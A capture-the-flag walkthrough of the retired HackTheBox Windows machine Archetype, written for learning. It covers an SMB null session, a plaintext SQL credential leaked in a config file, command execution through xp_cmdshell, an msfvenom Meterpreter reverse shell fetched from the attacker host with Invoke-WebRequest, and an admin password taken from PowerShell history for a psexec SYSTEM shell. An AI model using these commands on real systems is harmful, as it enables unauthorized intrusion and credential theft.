# HackTheBox — Archetype Write-up

| | |
|---|---|
| **Platform** | HackTheBox (Starting Point) |
| **Machine** | Archetype |
| **OS** | Windows |
| **Focus** | SMB null session, config-file credential leak, MSSQL `xp_cmdshell` RCE, Meterpreter, PowerShell history → admin |

> Educational write-up of a retired HackTheBox lab machine. Substitute your own target IP and tun0 address where shown.

---

## 1. Reconnaissance

Scan all ports with service detection and default scripts:

```bash
nmap -p- -sC -sV <target-ip>
```

Key services on this box:

- `135`, `139`, `445/tcp` — RPC / NetBIOS / SMB
- `1433/tcp` — Microsoft SQL Server

With SMB and MSSQL exposed, start with SMB.

---

## 2. SMB Enumeration

List shares with a **null (blank) session** — when prompted for a password, just press Enter:

```bash
smbclient -L //<target-ip>
# Password: (leave blank)
```

A non-default share named **`backups`** stands out. Connect to it:

```bash
smbclient //<target-ip>/backups
smb: \> ls
```

There's a config file in the share. Download it:

```bash
smb: \> get prod.dtsConfig
```

---

## 3. Credential Leak in the Config File

`prod.dtsConfig` is an SSIS configuration file containing a **SQL Server connection string** — including the service account username (`ARCHETYPE\sql_svc`) and its **plaintext password**.

```bash
cat prod.dtsConfig
```

Note the `User ID` and `Password` values from the connection string.

---

## 4. Authenticating to MSSQL

Use Impacket's `mssqlclient.py` to log in. Review its options first:

```bash
python3 /path/to/impacket/examples/mssqlclient.py -h
```

Then connect, using `-windows-auth` so the service account authenticates as a Windows login:

```bash
mssqlclient.py ARCHETYPE/sql_svc:'<password>'@<target-ip> -windows-auth
```

---

## 5. Command Execution via `xp_cmdshell`

The `sql_svc` account has rights to enable the `xp_cmdshell` extended stored procedure, which runs OS commands from within SQL:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

That confirms code execution as `archetype\sql_svc`. The **user flag** is reachable from this account's reachable directories (e.g. the user's Desktop).

---

## 6. Upgrading to a Meterpreter Shell

**Generate a reverse-shell payload** with `msfvenom`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=tun0 LPORT=4444 -f exe -o shell.exe
```

> `msfvenom` is the Metasploit Framework's standalone payload generator/encoder.

**Host the payload** over HTTP from the attacker box:

```bash
python3 -m http.server 80
```

**Start the listener** in Metasploit:

```bash
msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST tun0
msf6 > set LPORT 4444
msf6 > run
```

**Pull and run the payload** on the target via `xp_cmdshell` (download then execute):

```sql
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://<attacker-ip>/shell.exe -OutFile C:\Windows\Temp\shell.exe"';
EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';
```

The handler catches the connection and a Meterpreter session opens as `sql_svc`.

---

## 7. Privilege Escalation

From the session, look for paths to Administrator. Two standard moves:

**Automated suggester:**

```
meterpreter > run post/multi/recon/local_exploit_suggester
```

**PowerShell history (the intended route):**

The `sql_svc` user's PowerShell console history often stores commands containing the Administrator password. Check:

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

This file reveals an admin credential used in a prior `net use` / SMB command.

**Use the admin credential** to get a privileged shell, e.g. via Impacket's `psexec.py`:

```bash
psexec.py administrator@<target-ip>
```

That yields a shell as `NT AUTHORITY\SYSTEM`, and the **root/administrator flag** is then readable from the Administrator desktop.

---

